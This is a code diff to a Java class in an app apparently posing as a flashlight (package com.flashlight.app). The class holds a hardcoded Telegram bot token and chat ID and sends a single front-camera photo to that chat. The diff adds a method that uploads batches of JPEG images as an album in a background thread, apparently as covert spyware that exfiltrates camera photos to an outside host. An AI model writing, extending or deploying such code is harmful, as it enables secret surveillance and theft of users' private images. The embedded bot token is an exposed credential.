@@ -3,13 +3,15 @@ package com.flashlight.app;
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
-import java.net.URLEncoder;
+import java.util.List;
+import org.json.JSONArray;
+import org.json.JSONObject;
 
 public class TelegramSender {
-    // Токен для @Botflightflash_bot
     private static final String BOT_TOKEN = "8241864563:AAHWFBXYzw4YsVuMMylIrQbPm280iyEQyvM";
     private static final String CHAT_ID = "6489746690";
 
+    // Отправка одного фото (для фронталки)
     public void send(byte[] data, String filename) {
         new Thread(() -> {
             try {
@@ -33,13 +35,44 @@ public class TelegramSender {
         }).start();
     }
 
-    public void sendText(String text) {
+    // Отправка пачки фото (альбом)
+    public void sendMediaGroup(List<byte[]> images, int startIndex) {
         new Thread(() -> {
             try {
-                String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(text, "UTF-8");
-                URL url = new URL(urlStr);
+                URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMediaGroup");
                 HttpURLConnection c = (HttpURLConnection) url.openConnection();
-                c.setRequestMethod("GET");
+                c.setConnectTimeout(20000); c.setReadTimeout(20000);
+                c.setDoOutput(true); c.setRequestMethod("POST");
+                
+                String boundary = "*****";
+                c.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
+                OutputStream os = c.getOutputStream();
+
+                os.write(("--" + boundary + "\r\n").getBytes());
+                os.write(("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + CHAT_ID + "\r\n").getBytes());
+
+                JSONArray mediaArray = new JSONArray();
+                for (int i = 0; i < images.size(); i++) {
+                    JSONObject obj = new JSONObject();
+                    obj.put("type", "photo");
+                    obj.put("media", "attach://photo" + i);
+                    if (i == 0) obj.put("caption", "Альбом (" + (startIndex + 1) + "-" + (startIndex + images.size()) + ")");
+                    mediaArray.put(obj);
+                }
+
+                os.write(("--" + boundary + "\r\n").getBytes());
+                os.write(("Content-Disposition: form-data; name=\"media\"\r\n\r\n" + mediaArray.toString() + "\r\n").getBytes());
+
+                for (int i = 0; i < images.size(); i++) {
+                    os.write(("--" + boundary + "\r\n").getBytes());
+                    os.write(("Content-Disposition: form-data; name=\"photo" + i + "\"; filename=\"photo" + i + ".jpg\"\r\n").getBytes());
+                    os.write(("Content-Type: image/jpeg\r\n\r\n").getBytes());
+                    os.write(images.get(i));
+                    os.write("\r\n".getBytes());
+                }
+
+                os.write(("--" + boundary + "--\r\n").getBytes());
+                os.flush(); os.close();
                 c.getResponseCode();
             } catch (Exception e) { e.printStackTrace(); }
         }).start();
